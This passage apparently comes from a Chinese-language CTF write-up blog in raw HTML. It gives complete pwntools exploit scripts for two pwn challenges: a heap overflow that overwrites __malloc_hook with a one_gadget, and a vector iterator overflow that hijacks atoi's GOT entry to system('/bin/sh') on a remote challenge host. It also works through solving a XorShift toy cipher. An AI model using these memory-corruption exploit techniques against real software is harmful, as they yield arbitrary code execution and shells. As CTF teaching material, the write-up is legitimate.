    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'\n:'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index?\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'\n:'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index?\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">,</span> line<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'\n:'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index?\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> line<span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>


add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span> <span class="token comment"># 0</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span> <span class="token comment"># 1</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span> <span class="token comment"># 2</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span> <span class="token comment"># 3</span>


<span class="token comment"># 溢出0修改1的size字段</span>
payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> <span class="token string">'\xe1'</span>  <span class="token comment"># 只能溢出一个字节</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span>
dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token comment"># leak libc_base</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'aa'</span><span class="token punctuation">)</span> <span class="token comment"># 1，此时#2中存有unsorted bin的地址</span>
show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>
addr <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>
addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> addr <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7fee46df4b78</span> <span class="token operator">-</span> <span class="token number">0x7fee46a30000</span><span class="token punctuation">)</span> <span class="token comment">#(0x7febf7bfab78 - 0x7febf7871000)</span>
malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
realloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__realloc_hook'</span><span class="token punctuation">]</span>
realloc <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_realloc'</span><span class="token punctuation">]</span>
one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xf02a4</span> <span class="token comment"># 0x4526a #0xf1147</span>

<span class="token keyword">print</span> <span class="token string">'addr='</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'libc_base='</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'malloc_hook='</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'free_hook='</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'realloc_hook='</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>realloc_hook<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'realloc='</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>realloc<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'one_gadget='</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'aa'</span><span class="token punctuation">)</span> <span class="token comment"># 4 (和#2是同一个)</span>
dele<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment"># 此时这块在fast bin中，可以通过#2修改这块的fd指针</span>

edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>malloc_hook<span class="token operator">-</span><span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment">#gdb.attach(io)</span>
<span class="token comment">#raw_input()</span>

add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xb</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>realloc<span class="token operator">+</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 分别写入realloc_hook区域和malloc_hook区域（这两个区域相邻）</span>
<span class="token comment">#add(0x68, 'a'*0x13 + p64(one_gadget))</span>

io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'\n:'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size?\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment">#gdb.attach(io)</span>
<span class="token comment">#sleep(1)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="junior-iterator"><a href="#junior-iterator" class="headerlink" title="junior_iterator"></a>junior_iterator</h3><p>这题，多调试下还是能发现问题的，漏洞点在overwrite的处理函数里</p>
<p><img src="/images/e1de0fb/pwn-4-1.png" alt="1"></p>
<p>这个程序就是用一个数组保存了多个vector对象的地址，vector是类似数组的类对象，用数组的方式管理一个内存区域。连续创建vector对象（通过c++ new操作）,他们的内存区域相邻。</p>
<p>上面在通过迭代器（就类似指针吧，在汇编也确实间接使用了指针），把一个vector对象的管理的数组逐个赋值，但是却没有检查越界，可以覆盖下一给vector对象的数据。</p>
<p>通过调试，发现vector对象开头有两个重要的指针，分别指向了他所管理的内存区域的开头和末尾，暂且称为头指针，尾指针。可以通过溢出修改下一个vector对象的这两个指针，使其指向got表的atoi项，然后通过edit操作，修改atoi项为system函数地址，使得调用<code>atoi(&quot;/bin/sh&quot;)</code>就成功getshell了，为什么要劫持atoi呢？因为程序中调用最多的，而且最符合<code>system(arg)</code>这样形式的函数就是这个了（除此之外还有atol）：</p>
<p><img src="/images/e1de0fb/pwn-4-2.png" alt="2"></p>
<p><img src="/images/e1de0fb/pwn-4-3.png" alt="3"></p>
<p>要注意的是：获取数组长度的方式是通过两个指针的值相减除以8（这里一个元素占用8个字节），edit有检查越界的，所以要注意修改两个指针的时候要使得长度合适</p>
<p>exp如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token comment">#coding=utf-8</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span>

<span class="token comment">#io = process(['./main'], env=&#123;'LD_PRELOAD': './libc-2.23.so'&#125;)</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.103.214.163'</span><span class="token punctuation">,</span> <span class="token number">20303</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./main'</span><span class="token punctuation">)</span>
<span class="token comment">#libc = ELF('./libc-2.23.so')</span>


<span class="token keyword">def</span> <span class="token function">new_list</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'List count: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>lid<span class="token punctuation">,</span> index<span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'List id: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lid<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Item id: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'New number: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>lid<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'List id: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lid<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Item id: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">overwrite</span><span class="token punctuation">(</span>lid<span class="token punctuation">,</span> start<span class="token punctuation">,</span> end<span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'List id: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lid<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Star id: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'End id: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>end<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'New number: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token comment"># vector&lt;int> arr[10]</span>
<span class="token comment"># 先创建两个vector对象，大小为1个单位</span>
new_list<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#0 </span>
new_list<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#1 </span>

<span class="token keyword">print</span> <span class="token string">"got['atoi']="</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment"># 调试填充4个8字节为单位的区域后才是下一个vector对象的数据</span>
overwrite<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 覆盖了#1 vector对象存的的头指针</span>
overwrite<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># 尾指针</span>
show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>

atoi_addr <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'Number: '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
atoi_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>atoi_addr<span class="token punctuation">)</span> 
libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'atoi'</span><span class="token punctuation">,</span> atoi_addr<span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> atoi_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'atoi'</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>

<span class="token keyword">print</span> <span class="token string">'atoi_addr='</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>atoi_addr<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'libc_base='</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'system_addr='</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>

edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> system_addr<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span> <span class="token comment"># atoi("/bin/sh")，因为atoi已经被劫持成system了</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="ToyCipher-XorShift"><a href="#ToyCipher-XorShift" class="headerlink" title="ToyCipher_XorShift"></a>ToyCipher_XorShift</h3><p>最关键的是这个函数：</p>
<p><img src="/images/e1de0fb/crypto-1-1.png" alt="1"></p>
<p>只要能写出这个函数的逆过程就相当于完成一大半了，其实就是位运算，数学上有个东西叫做错位相减，这个东西其实差不多，错位（右移，左移）然后异或。假设参数a为1，shr为True，且假设MASK掩码使得x为1个字节也就是8位的数（源码中<code>x = x&amp;MASK</code>的作用就是保证x为64位整数），那么进行的运算如下图：</p>
<p><img src="/images/e1de0fb/crypto-1-2.png" alt="2"></p>
<p>其中框框里的数字就是个代号，代表哪一个bit（位），由于右移一位后，高位的补的0和任何数异或都得原来的数，所以运算后最高处的那个bit是没有改变的，可以根据这一位和下一位异或，得到原来的下一位，有点绕。</p>
<p>看下面：</p>
<pre class="line-numbers language-none"><code class="language-none">raw_bit0 &#x3D; bit0
bit1 &#x3D; raw_bit0 xor raw_bit1 &#x3D;&#x3D;&gt; raw_bit1 &#x3D; bit1 xor raw_bit0
bit2 &#x3D; raw_bit1 xor raw_bit2 &#x3D;&#x3D;&gt; raw_bit2 &#x3D; bit2 xor raw_bit1
....<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>其中<code>raw_bitxxx</code>代表错位异或前的第<code>xxx</code>位，<code>bitxxx</code>表示异或后的第<code>xxx</code>位，可以根据上面这样一步一步还原原来的每一位。</p>
<p>如果a为2，那么最高2位就是已知的，为3，那么最高3位已知，以此类推</p>
<p>如果shr=False，也就是左移而不是右移呢？道理一样，偷个懒，不想分别写两个情况的代码，直接写右移的处理，任何左移就把高低位反过来当作右移来解，再反回来。</p>
<p>exp如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python3</span>
<span class="token keyword">import</span> sys

enc_data <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'15eb80358fe6f89b1802a5f3eb5a6ec6c33dc4f35822fb6e97e0b22be860a28602b35e2930a93ac5'</span><span class="token punctuation">)</span>
IV <span class="token operator">=</span> <span class="token string">b'c8C~M0d3'</span>


BLOCKSIZE <span class="token operator">=</span> <span class="token number">8</span>
BITSLENGTH <span class="token operator">=</span> <span class="token number">8</span><span class="token operator">*</span>BLOCKSIZE
MASK <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> BITSLENGTH<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>
BLOCKS <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">:</span> <span class="token punctuation">[</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token operator">*</span>BLOCKSIZE<span class="token punctuation">:</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>BLOCKSIZE<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">//</span>BLOCKSIZE<span class="token punctuation">)</span> <span class="token punctuation">]</span>
XOR <span class="token operator">=</span> <span class="token keyword">lambda</span> s1<span class="token punctuation">,</span> s2<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token operator">^</span>y <span class="token keyword">for</span> x<span class="token punctuation">,</span>y <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">bin_at</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">shr_f</span><span class="token punctuation">(</span>lst<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""错位异或，还原每一bit"""</span>
    x <span class="token operator">=</span> lst
    i <span class="token operator">=</span> <span class="token number">0</span>
    j <span class="token operator">=</span> a
    <span class="token keyword">while</span> j <span class="token operator">&lt;</span> BITSLENGTH<span class="token punctuation">:</span>
        at_j <span class="token operator">=</span> bin_at<span class="token punctuation">(</span>x<span class="token punctuation">,</span> i<span class="token punctuation">)</span> <span class="token operator">^</span> bin_at<span class="token punctuation">(</span>x<span class="token punctuation">,</span> j<span class="token punctuation">)</span> <span class="token comment"># 第j位（从高位开始算0)原来的样子</span>
        x<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>at_j<span class="token punctuation">)</span>
        i <span class="token operator">+=</span> <span class="token number">1</span>
        j <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">return</span> x

<span class="token keyword">def</span> <span class="token function">dec_f</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> a<span class="token punctuation">,</span> shr<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 一开始错用strip('0b')导致各种奇奇怪怪问题</span>
    x <span class="token operator">=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>BITSLENGTH<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>  <span class="token comment"># 高位补零</span>
    x <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
    <span class="token keyword">if</span> shr<span class="token punctuation">:</span>
        x <span class="token operator">=</span> shr_f<span class="token punctuation">(</span>x<span class="token punctuation">,</span> a<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token comment"># 左移相当于，先反转后的右移错位异或再反转回来</span>
        x <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
        x <span class="token operator">=</span> shr_f<span class="token punctuation">(</span>x<span class="token punctuation">,</span> a<span class="token punctuation">)</span>
        x <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
    x <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
    x <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> x 


<span class="token keyword">def</span> <span class="token function">dec</span><span class="token punctuation">(</span>block<span class="token punctuation">)</span><span class="token punctuation">:</span>
    block <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>block<span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span>
    block <span class="token operator">=</span> dec_f<span class="token punctuation">(</span>block<span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> shr<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    block <span class="token operator">=</span> dec_f<span class="token punctuation">(</span>block<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> shr<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    block <span class="token operator">=</span> dec_f<span class="token punctuation">(</span>block<span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> shr<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> block<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span>BLOCKSIZE<span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> iv<span class="token punctuation">)</span><span class="token punctuation">:</span>
    mid <span class="token operator">=</span> iv
    ret <span class="token operator">=</span> <span class="token string">b''</span>
    <span class="token keyword">for</span> block <span class="token keyword">in</span> BLOCKS<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>
        m <span class="token operator">=</span> XOR<span class="token punctuation">(</span>dec<span class="token punctuation">(</span>block<span class="token punctuation">)</span><span class="token punctuation">,</span> mid<span class="token punctuation">)</span>
        mid <span class="token operator">=</span> block
        ret <span class="token operator">+=</span> m
    <span class="token keyword">return</span> ret

